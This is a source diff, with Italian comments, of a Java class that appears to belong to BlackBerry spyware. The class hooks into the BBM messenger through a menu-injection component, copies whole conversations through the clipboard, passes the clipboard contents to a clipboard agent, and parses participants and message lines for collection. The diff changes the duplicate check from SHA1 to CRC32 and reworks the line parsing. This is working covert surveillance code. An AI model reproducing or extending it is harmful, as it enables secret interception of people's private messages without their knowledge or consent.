@@ -16,7 +16,6 @@ import net.rim.device.api.system.Backlight;
 import net.rim.device.api.system.Clipboard;
 import net.rim.device.api.ui.Screen;
 import net.rim.device.api.ui.UiApplication;
-import net.rim.device.api.util.Arrays;
 import blackberry.agent.ClipBoardAgent;
 import blackberry.agent.ImAgent;
 import blackberry.crypto.Encryption;
@@ -24,11 +23,14 @@ import blackberry.debug.Check;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.injection.MenuWalker;
+import blackberry.utils.StringUtils;
 
 public class ConversationScreen {
     //#ifdef DEBUG
     private static Debug debug = new Debug("ConvScreen", DebugLevel.VERBOSE);
     //#endif
+
+    private static Vector parts;
 
     private UiApplication bbmApplication;
     private Vector conversationScreens = new Vector();
@@ -68,14 +70,15 @@ public class ConversationScreen {
                         debug.info("Added new conversation screen: " + screen);
                         //#endif
                         conversationScreens.addElement(screen);
-                        conversations
-                                .put(screen, Encryption.SHA1(conversation));
+                        conversations.put(screen,
+                                new Integer(Encryption.CRC32(conversation)));
 
                         // exploreField(screen, 0, new String[0]);
                     } else {
                         // se conversation e' uguale all'ultima parsata non fare niente.
-                        byte[] hash = (byte[]) conversations.get(screen);
-                        if (Arrays.equals(hash, Encryption.SHA1(conversation))) {
+                        Integer hash = (Integer) conversations.get(screen);
+                        if (hash.equals(new Integer(Encryption
+                                .CRC32(conversation)))) {
                             //#ifdef DEBUG
                             debug.trace("getConversationScreen: equal conversation, ignore it");
                             //#endif
@@ -84,6 +87,7 @@ public class ConversationScreen {
                     }
 
                     // parse della conversazione.
+                    // result e' un vettore di stringhe
                     Vector result = parseConversation(conversation);
 
                     if (result != null) {
@@ -140,17 +144,9 @@ public class ConversationScreen {
             clip = (String) Clipboard.getClipboard().get();
             ClipBoardAgent.getInstance().setClip(clip);
 
-            try {
-                //Clipboard.getClipboard().put(before);
-            } catch (Exception ex) {
-                //#ifdef DEBUG
-                debug.error("extractConversation: clip " + ex);
-                //#endif
-            }
-
             if (!conversationScreens.contains(screen)) {
                 //#ifdef DEBUG
-                debug.info("Clip: " + clip);
+                debug.info("adding clip to screens: " + clip);
                 //#endif
             }
 
@@ -163,6 +159,11 @@ public class ConversationScreen {
         return clip;
     }
 
+    /**
+     * parse conversation
+     * @param conversation
+     * @return Vector<String partecipants, Vector<String line> lines>
+     */
     public static Vector parseConversation(String conversation) {
         // Participants:
         // -------------
@@ -183,12 +184,22 @@ public class ConversationScreen {
 
             partecipants = conversation.substring(partStart, partEnd).trim();
 
+            parts = StringUtils.split(partecipants, ", ");
+
             Vector result = new Vector();
 
             int posMessages = getLinePos(conversation, 6);
             int numLine = 1;
 
             Vector lines = new Vector();
+
+            // per ogni linea
+            //   se e' un inizio
+            //       si elabora la last
+            //       last = current.startAfter(partecipant)
+            //   senno' 
+            //       last += current
+            // elabora la last
 
             String lastLine = "";
             while (true) {
@@ -205,20 +216,27 @@ public class ConversationScreen {
                 }
                 numLine += 1;
 
-                // unisce le linee spezzate del nome
-                if (currentLine.indexOf(":") < 0) {
+                int lineStart = searchPartecipant(currentLine);
+
+                if (lineStart > 0) {
+                    // c'e' un partecipante
+                    // elabora la linea precedente
+                    //#ifdef DEBUG
+                    debug.trace("parseConversation part line: "
+                            + currentLine);
+                    //#endif
+                    lines.addElement(lastLine.trim());
                     lastLine = currentLine;
-                    continue;
                 } else {
-                    currentLine = lastLine + " " + currentLine;
-                    lastLine = "";
+                    //#ifdef DEBUG
+                    debug.trace("parseConversation adding line: " + currentLine);
+                    //#endif
+                    lastLine += " " + currentLine;
                 }
 
-                //#ifdef DEBUG
-                debug.trace("parseConversation adding line: " + currentLine);
-                //#endif
-                lines.addElement(currentLine.trim());
             }
+            //adding last line
+            lines.addElement(lastLine.trim());
 
             //agent.add(partecipants, lines);
             //#ifdef DEBUG
@@ -240,6 +258,29 @@ public class ConversationScreen {
 
     }
 
+    // se ci sono i partecipanti, restituisce la posizione dopo il :
+    // senno 0
+    private static int searchPartecipant(String currentLine) {
+        int pos = 0;
+
+        pos = currentLine.indexOf(": ");
+        if (pos > 0) {
+            String part = currentLine.substring(0, pos);
+            if (parts.contains(part)) {
+                return pos + 2;
+            }
+        }
+
+        return 0;
+    }
+
+    /**
+     * get the next line of conversation starting from posMessage
+     * 
+     * @param conversation
+     * @param posMessages
+     * @return
+     */
     private static String getNextLine(String conversation, int posMessages) {
 
         int endLinePos = conversation.indexOf("\n", posMessages);
@@ -250,6 +291,13 @@ public class ConversationScreen {
         }
     }
 
+    /**
+     * Retrieves the numLine line of conversation
+     * 
+     * @param conversation
+     * @param numLine
+     * @return
+     */
     private static int getLinePos(String conversation, int numLine) {
         int nextLine = 0;
         for (int i = 0; i < numLine; i++) {
